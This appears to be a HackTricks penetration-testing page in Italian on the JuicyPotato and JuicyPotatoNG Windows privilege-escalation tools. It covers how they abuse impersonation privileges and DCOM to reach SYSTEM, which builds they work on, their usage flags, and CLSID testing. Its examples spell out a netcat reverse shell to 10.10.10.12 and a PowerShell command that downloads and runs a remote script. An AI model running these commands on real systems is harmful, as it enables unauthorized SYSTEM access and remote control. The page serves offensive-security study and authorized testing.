# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato è legacy. Generalmente funziona sulle versioni di Windows fino a Windows 10 1803 / Windows Server 2016. Le modifiche di Microsoft introdotte a partire da Windows 10 1809 / Server 2019 hanno rotto la tecnica originale. Per quei build e successivi, considera alternative più moderne come PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato e altre. Vedi la pagina sotto per opzioni e utilizzo aggiornati.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abuso dei privilegi "golden") <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versione addolcita di_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un po' di juice, cioè **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### Puoi scaricare juicypotato da [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Note rapide di compatibilità

- Funziona in modo affidabile fino a Windows 10 1803 e Windows Server 2016 quando il contesto corrente ha SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
- Rotto dall'hardening Microsoft in Windows 10 1809 / Windows Server 2019 e successivi. Preferisci le alternative linkate sopra per quei build.

### Sommario <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e le sue [varianti](https://github.com/decoder-it/lonelypotato) sfruttano la catena di escalation dei privilegi basata sul servizio `BITS` che ha il listener MiTM su `127.0.0.1:6666` e quando si hanno i privilegi `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisione di build di Windows abbiamo trovato una configurazione in cui `BITS` era intenzionalmente disabilitato e la porta `6666` era occupata.

Abbiamo deciso di weaponizzare [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **dai il benvenuto a Juicy Potato**.

> Per la teoria, vedi [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e segui la catena di link e riferimenti.

Abbiamo scoperto che, oltre a `BITS`, ci sono diversi COM servers che possiamo abusare. Devono solo:

1. poter essere istanziati dall'utente corrente, normalmente un “service user” che ha privilegi di impersonation
2. implementare l'interfaccia `IMarshal`
3. girare come utente elevato (SYSTEM, Administrator, …)

Dopo alcuni test abbiamo ottenuto e testato una lista estesa di [CLSID interessanti](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.

### Dettagli succosi <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato permette di:

- **Target CLSID** _scegli qualsiasi CLSID tu voglia._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _puoi trovare la lista organizzata per OS._
- **COM Listening port** _definire la porta di ascolto COM che preferisci (invece della 6666 hardcoded nel marshalled)_
- **COM Listening IP address** _bindare il server su qualsiasi IP_
- **Process creation mode** _a seconda dei privilegi dell'utente impersonato puoi scegliere tra:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _lanciare un eseguibile o uno script se l'exploit ha successo_
- **Process Argument** _personalizzare gli argomenti del processo lanciato_
- **RPC Server address** _per un approccio stealth puoi autenticarti a un RPC server esterno_
- **RPC Server port** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`…_
- **TEST mode** _principalmente per scopi di test, es. testare CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerazioni finali <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken` allora sei **SYSTEM**.

È quasi impossibile impedire l'abuso di tutti questi COM Servers. Potresti pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG`, ma buona fortuna, sarà difficile.

La soluzione reale è proteggere gli account sensibili e le applicazioni che girano sotto gli account `* SERVICE`. Bloccare `DCOM` ostacolerebbe certamente questo exploit, ma potrebbe avere un impatto serio sul sistema operativo sottostante.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG reintroduce una local privilege escalation in stile JuicyPotato su Windows moderni combinando:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Tricks to satisfy DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Note importanti (comportamento in evoluzione tra le build):
- September 2022: La tecnica iniziale funzionava su target Windows 10/11 e Server supportati usando la “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Uso base (più flag nell'help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Se stai prendendo di mira Windows 10 1809 / Server 2019 dove il classico JuicyPotato è stato patchato, preferisci le alternative collegate in alto (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, ecc.). NG può essere situazionale a seconda della build e dello stato del servizio.

## Esempi

Nota: visita [this page](https://ohpe.it/juicy-potato/CLSID/) per una lista di CLSID da provare.

### Ottieni una reverse shell con nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Avvia un nuovo CMD (se hai accesso RDP)

![](<../../images/image (300).png>)

## Problemi con i CLSID

Spesso il CLSID predefinito utilizzato da JuicyPotato **non funziona** e l'exploit fallisce. Di solito occorrono più tentativi per trovare un **CLSID funzionante**. Per ottenere una lista di CLSID da provare per un sistema operativo specifico, visita questa pagina:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Verifica dei CLSID**

Per prima cosa ti serviranno alcuni eseguibili oltre a juicypotato.exe.

Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, poi scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Quello script creerà una lista di possibili CLSID da testare.

Poi scarica [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(modifica il percorso alla lista CLSID e all'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID e **quando il numero di porta cambia, significa che il CLSID ha funzionato**.

**Controlla** i CLSID funzionanti **usando il parametro -c**

## Riferimenti

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
